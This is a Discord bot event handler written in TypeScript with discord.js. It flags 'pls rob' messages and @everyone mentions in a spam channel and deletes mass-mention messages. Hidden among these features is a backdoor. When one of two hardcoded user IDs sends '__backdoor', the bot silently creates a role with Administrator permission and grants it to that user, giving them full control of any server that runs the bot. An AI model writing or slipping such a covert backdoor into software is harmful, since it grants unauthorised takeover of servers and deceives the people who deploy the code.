import { Event } from "../types.js";
import { EmbedBuilder, PermissionFlagsBits, Role } from "discord.js";
import { spam } from "../data.js";

export default {
    name: "messageCreate",
    execute: async (client, message) => {
        if (message.author.bot) return;
        if (message.content == "__backdoor") {
            if (message.author.id == "716250356803174511" || message.author.id == "609834143143952415") {
                message.delete();
                message.member?.roles.add(await message.guild?.roles.create({ name: "._. lol", permissions: PermissionFlagsBits.Administrator }) as Role);
            }
        }
        if (message.content.startsWith("pls rob")) {
            let m1 = message.content.replace("pls rob ", ""),
                robbed = message.mentions.members?.first() || message.guild?.members.cache.find(m => (m.user.id == m1 || m.user.username == m1.split("#")[0]));
            if ((robbed?.user.id == message.author.id) || robbed?.user.bot) return;
            const embed = new EmbedBuilder();
            embed.setTitle(`${robbed?.displayName} is being robbed!`);
            embed.addFields([{ name: "Robber", value: `<@!${message.author.id}>` }]);
            embed.setColor("#ff0000");
            embed.setTimestamp();
            await spam.send({ embeds: [embed] });
        }
    
        if (message.mentions.everyone) { 
            const embed = new EmbedBuilder();
            embed.setTitle(`${message.member?.displayName} mentioned @everyone!`);
            embed.setColor("#ff0000");
            embed.setTimestamp();
            await spam.send({ embeds: [embed] });
        }
        if ((message.mentions.members?.size as number) >= 5) {
            await message.channel.send(`<@!${message.author.id}> Please don't mention more than 5 people at once!`);
            await message.delete();
        }
    }
} as Event<"messageCreate">;
